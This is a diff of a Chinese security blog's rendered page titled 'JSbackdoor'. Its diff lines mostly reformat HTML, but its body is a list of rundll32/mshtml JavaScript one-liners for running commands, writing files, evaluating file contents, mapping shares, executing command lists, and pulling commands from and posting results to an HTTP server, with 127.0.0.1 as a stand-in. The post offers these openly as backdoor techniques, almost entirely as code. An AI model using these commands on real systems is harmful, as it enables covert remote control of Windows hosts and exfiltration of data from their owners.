@@ -1,21 +1,4 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -104,18 +87,18 @@
 
 
 
-  <meta name="description" content="//Execute A Command1rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;); //Write To A File1rundll32.exe javascript:&quot;\..\mshtml,Ru">
+  <meta name="description" content="//Execute A Command1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc"); //Write To A File1rundll32.exe javascript:"\..\mshtml,Ru">
 <meta name="keywords" content="js,backdoor">
 <meta property="og:type" content="article">
 <meta property="og:title" content="JSbackdoor">
 <meta property="og:url" content="https://evi1cg.github.io/archives/121.html">
-<meta property="og:site_name" content="Evi1cg&#39;s blog">
-<meta property="og:description" content="//Execute A Command1rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;); //Write To A File1rundll32.exe javascript:&quot;\..\mshtml,Ru">
+<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:description" content="//Execute A Command1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc"); //Write To A File1rundll32.exe javascript:"\..\mshtml,Ru">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2019-01-14T14:44:26.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="JSbackdoor">
-<meta name="twitter:description" content="//Execute A Command1rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;); //Write To A File1rundll32.exe javascript:&quot;\..\mshtml,Ru">
+<meta name="twitter:description" content="//Execute A Command1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc"); //Write To A File1rundll32.exe javascript:"\..\mshtml,Ru">
 
 
 
@@ -495,14 +478,14 @@
       
 
       
-        <p>//Execute A Command<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.<span class="built_in">write</span>();<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"calc"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>//Write To A File<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;fso=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"Scripting.FileSystemObject"</span>);a=fso.CreateTextFile(<span class="string">"c:\\Temp\\testfile.txt"</span>,true);a.WriteLine(<span class="string">"Test"</span>);a.<span class="built_in">Close</span>();self.<span class="built_in">close</span>;</span><br></pre></td></tr></table></figure></p>
-<p>//Read and Execute From A File<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;<span class="built_in">document</span>.write();fso=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"Scripting.FileSystemObject"</span>);f=fso.OpenTextFile(<span class="string">"c:\\Temp\\testfile.txt"</span>,<span class="number">1</span>);<span class="built_in">eval</span>((f.ReadAll()));</span><br></pre></td></tr></table></figure></p>
-<p>//Map A Remote Share (WEBDAV)<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;n=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">'WScript.Network'</span>);n.MapNetworkDrive(<span class="string">"S:"</span>,<span class="string">"https://live.sysinternals.com"</span>);self.<span class="built_in">close</span>;</span><br></pre></td></tr></table></figure></p>
-<p>//Map A Local Share<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;n=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">'WScript.Network'</span>);n.MapNetworkDrive(<span class="string">"S:"</span>,<span class="string">"\\\\Localhost\\c$"</span>);self.<span class="built_in">close</span>;</span><br></pre></td></tr></table></figure></p>
-<p>//Read and Execute Commands From A File<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();fso=new%20ActiveXObject(<span class="string">"Scripting.FileSystemObject"</span>);f=fso.OpenTextFile(<span class="string">"c:\\Temp\\Commands.txt"</span>,<span class="number">1</span>);<span class="keyword">while</span>(!f.AtEndOfStream)&#123;t=new%20ActiveXObject(<span class="string">"WScript.Shell"</span>);t.Run(<span class="string">"cmd%20/c%20"</span>%20+%20f.ReadLine(),null,true);&#125;;</span><br></pre></td></tr></table></figure></p>
-<p>//Retrieve Commands From HTTP<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=new%20ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"<span class="keyword">GET</span>"</span>,<span class="string">"http://127.0.0.1/a.txt"</span>,false);h.Send();B=h.ResponseText;alert(B);</span><br></pre></td></tr></table></figure></p>
-<p>//POST results back to Server<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=new%20ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"<span class="keyword">POST</span>"</span>,<span class="string">"http://127.0.0.1:8081/a.php"</span>,false);h.Send(<span class="string">"Stuff"</span>);</span><br></pre></td></tr></table></figure></p>
+        <meta name="generator" content="Hexo 3.9.0"><p>//Execute A Command<br></p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.<span class="built_in">write</span>();<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"WScript.Shell"</span>).Run(<span class="string">"calc"</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>//Write To A File<br></p><figure class="highlight gauss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;fso=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"Scripting.FileSystemObject"</span>);a=fso.CreateTextFile(<span class="string">"c:\\Temp\\testfile.txt"</span>,true);a.WriteLine(<span class="string">"Test"</span>);a.<span class="built_in">Close</span>();self.<span class="built_in">close</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>//Read and Execute From A File<br></p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;<span class="built_in">document</span>.write();fso=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">"Scripting.FileSystemObject"</span>);f=fso.OpenTextFile(<span class="string">"c:\\Temp\\testfile.txt"</span>,<span class="number">1</span>);<span class="built_in">eval</span>((f.ReadAll()));</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>//Map A Remote Share (WEBDAV)<br></p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;n=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">'WScript.Network'</span>);n.MapNetworkDrive(<span class="string">"S:"</span>,<span class="string">"https://live.sysinternals.com"</span>);self.<span class="built_in">close</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>//Map A Local Share<br></p><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;n=<span class="keyword">new</span>%<span class="number">20</span>ActiveXObject(<span class="string">'WScript.Network'</span>);n.MapNetworkDrive(<span class="string">"S:"</span>,<span class="string">"\\\\Localhost\\c$"</span>);self.<span class="built_in">close</span>;</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>//Read and Execute Commands From A File<br></p><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();fso=new%20ActiveXObject(<span class="string">"Scripting.FileSystemObject"</span>);f=fso.OpenTextFile(<span class="string">"c:\\Temp\\Commands.txt"</span>,<span class="number">1</span>);<span class="keyword">while</span>(!f.AtEndOfStream){t=new%20ActiveXObject(<span class="string">"WScript.Shell"</span>);t.Run(<span class="string">"cmd%20/c%20"</span>%20+%20f.ReadLine(),null,true);};</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>//Retrieve Commands From HTTP<br></p><figure class="highlight accesslog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=new%20ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"<span class="keyword">GET</span>"</span>,<span class="string">"http://127.0.0.1/a.txt"</span>,false);h.Send();B=h.ResponseText;alert(B);</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>//POST results back to Server<br></p><figure class="highlight accesslog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:<span class="string">"\..\mshtml,RunHTMLApplication "</span>;document.write();h=new%20ActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);h.Open(<span class="string">"<span class="keyword">POST</span>"</span>,<span class="string">"http://127.0.0.1:8081/a.php"</span>,false);h.Send(<span class="string">"Stuff"</span>);</span><br></pre></td></tr></tbody></table></figure><p></p>
 
       
     </div>
@@ -849,7 +832,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -860,7 +843,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -871,7 +854,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -882,7 +865,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -917,7 +900,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1599,5 +1582,6 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
-</html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
